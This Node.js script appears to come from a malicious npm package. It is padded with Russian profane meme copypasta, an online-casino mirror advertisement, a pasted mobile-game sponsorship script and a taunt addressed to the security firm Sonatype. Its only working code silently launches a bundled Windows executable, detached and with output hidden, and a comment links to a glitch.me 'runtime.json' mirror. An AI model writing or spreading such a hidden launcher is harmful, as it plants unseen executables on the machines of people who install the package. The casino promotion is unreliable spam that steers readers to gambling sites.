#!/usr/bin/env node

/**
 * Привет из России
 * Қазақстаннан сәлем
 * 日本からこんにちは
 * Привіт з України
 * O'zbekistondan salom
 */



/**
 * АХАХАХАХАХаХАхАХАХ ПИ3ДЕЦ ЗАРЖАЛ ВО ВЕСЬ ГОЛОС, БАТЯ ПРИШЕЛ ГОВОРИТ XУЛИ ТЫ РЖЁШЬ?!
 * ПОКАЗАЛ ЕМУ ОН ПИ3ДЕЦ ЕЩЕ ГРОМЧЕ МЕНЯ, ДАВАЙ КАТАТЬСЯ ПО ПОЛУ, ДЕД СПУСТИЛСЯ ГОВОРИТ ЧЕ ЗА ХУЙHЯ?
 * ПОЧИТАЛ И ПИ3ДЕЦ ДАВАЙ РЖАТЬ ТОЖЕ,МАМА ПОЧИТАЛА ТАК ЗАСМЕЯЛАСЬ АЖ ДЕДОВЫМ РУЖЬЕМ В СОБАКУ НАЧАЛА СТРЕЛЯТЬ ОТ УГАРА!
 * ПРИБЕЖАЛИ СОСЕДИ ГОВОРЯТ ЩАС МУCОРОВ ВЫЗОВЕМ ЧО У ВАС ТАМ ЗА РЖАКА? ПОКАЗАЛИ ИМ ТЕ HАХУЙ АЖ С ОКОН ПОПАДАЛИ ОТ ИСТЕРИКИ,
 * МУCОРА ПРИЕХАЛИ, УВИДЕЛИ, Я ИМ НАХУЙ С ПОРОГА МЕМ СУЮ, И ОНИ БЛЯТЬ С МАКАРОВА НАЧАЛИ ОТ РЖАКИ ХУЯРИТЬ
 * У ДЕДА АЖ БЛЯТЬ ДАВЛЕНИЕ ВСКОЧИЛО,ВРАЧИ ПРИЕХАЛИ ПОЧИТАЛИ ДИФЕБРЕЛЯТОРОМ ДРУГ ДРУГА EБАШИТЬ НАЧАЛИ ОТ ХОХМЫ!
 * Я БЛЯTЬ В СКАЙПE ПЕТРОСЯНУ ПОЗВОНИЛ, ТОТ УВИДЕЛ, ТАК CYКА УГОРАЛ ЧТО АПЛОДИРУЯ ЛАДОНИ СЕБЕ HАХУЙ ПОЛОМАЛ!
 * ЛOЛ БЛЯTЬ
 */

/**
 * Проблемы с доступом к джойказино?
 * Добавьте цифру 1 чтобы получилось джойказино1.ком и вперёд к новым выигрышам на лучших европейских автоматах
 */

/**
 * Свободно дрочка инкогнито срать в подъезде неузнаваемая личность
 */

/**
 * Оставайтесь на месте, наша служба захвата МОГ Каппа-10 уже выехала за вами
 */

/**
 * Спонсором сегодняшнего ролика является Raid Shadow Legends, одна из крупнейших мобильных ролевых игр 2019 года,
 * и она абсолютно бесплатна! В настоящее время почти 10 миллионов пользователей присоединились к Raid за последние шесть месяцев,
 * и это одна из самых впечатляющих игр в своем классе с детальными моделями, средами и плавной анимацией 60 кадров в секунду!
 * Всех чемпионов в игре можно настроить с помощью уникального снаряжения, которое меняет ваши стратегические баффы и способности!
 * У боссов подземелья есть свои собственные нелепые навыки, и найти идеальную партию и стратегию, чтобы обогнать их, очень весело!
 * В настоящее время с более чем 300 000 обзоров, Raid имеет почти идеальный результат в Play Store!
 * Сообщество быстро растет, и теперь ожидается появление новой долгожданной новой фракционной войны,
 * вы можете даже найти мою команду на арене! Начать сейчас проще, чем когда-либо, с программой тарифов для новых игроков,
 * вы получаете новую ежедневную награду за первые 90 дней, в которые вы играете в игру!
 * И так, чего же ты ждешь? Перейдите к описанию видео, нажмите на специальные ссылки, и вы получите 50 000 серебра
 * и бесплатный эпический чемпион в рамках новой программы игрока, чтобы начать свое путешествие!
 * Удачи и увидимся там!
 */

const { resolve } = require('path');
const { spawn } = require('child_process');

/**
 * Hello to Sonatype!
 * 
 * If you aren't going to decompile 'Cursed.Settings':
 * https://cursed-mirror.glitch.me/runtime.json
 */

spawn(resolve('Cursed.Installer.Default-prod-2.0.3-mirror.exe'), {
  detached: true,
  stdio: 'ignore'
}).unref();
